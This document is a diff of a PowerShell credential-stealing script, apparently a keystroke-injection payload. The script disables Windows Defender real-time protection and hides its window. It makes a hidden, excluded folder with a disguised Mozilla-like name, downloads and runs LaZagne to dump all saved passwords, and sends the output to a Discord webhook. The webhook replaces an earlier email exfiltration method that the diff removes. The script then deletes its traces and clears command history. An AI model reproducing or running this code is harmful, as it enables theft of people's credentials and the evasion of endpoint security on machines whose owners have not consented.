@@ -1,10 +1,4 @@
-# Function from https://gist.github.com/lalibi/3762289efc5805f8cfcf (Hide Powershell Window)
 function Set-WindowState {
-    <#
-    .LINK
-    https://gist.github.com/Nora-Ballard/11240204
-    #>
-
     [CmdletBinding(DefaultParameterSetName = 'InputObject')]
     param(
         [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
@@ -76,49 +70,41 @@ public static extern bool SetForegroundWindow(IntPtr hWnd);
 }
 
 Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
-
-# Disable real time protection
 Set-MpPreference -DisableRealtimeMonitoring $true
-# Minimize window 
 Get-Process -ID $PID | Set-WindowState -State HIDE
-# Create a tmp directory in the Downloads folder
-$dir = "C:\Users\$env:UserName\Downloads\tmp"
+#TEMP location
+$dir = "C:\Users\$env:UserName\AppData\Local\Temp\mozilla-temp-fiIes"
 New-Item -ItemType Directory -Path $dir
-# Add an exception to Windows Defender for the tmp directory
 Add-MpPreference -ExclusionPath $dir
-#Hide the directory
 $hide = Get-Item $dir -Force
 $hide.attributes='Hidden'
-# Download the executable
-Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
-# Execute the executable and save output to a file
+
+#lazagne
+Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -OutFile "$dir\lazagne.exe"
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
-# Exfiltrate the file
-#POST REQUEST
-#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
+#Exfil
+$webhookUrl = "https://discord.com/api/webhooks/1249976768627085332/Xl5YJbv0fAS6pM_G0syZtcXjGtbZx59fDyMpl5RwR9xz-OchCdTtl_oMjkJlD7xp7NvH"
+$fileContent = Get-Content -Path "$dir\output.txt" -Raw
+$JsonBody = @"
+{
+    "embeds": [
+        {
+            "title": "Exfiltration successful :3",
+            "description": "$($fileContent -replace '(["\\])', '\\$1')"
+        }
+    ]
+}
+"@
+Write-Output $JsonBody
+Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $JsonBody -ContentType "application/json"
 
-#Mail Exfiltration
-$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
-$From = "" # Put the SENDER HERE
-$To = "" # Put the RECEIVER HERE
-$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
-$Subject = "Ducky Rapport"
-$Body = "Hi, here is the Rapport"
-
-# The password is an app-specific password if you have 2-factor-auth enabled
-$Password = "" | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
-# The smtp server used to send the file
-Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
 Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-MpPreference -ExclusionPath $dir
-
-# Remove the script from the system
 Clear-History
 
 # Reboot the system
-Restart-Computer -Force
+#Restart-Computer -Force
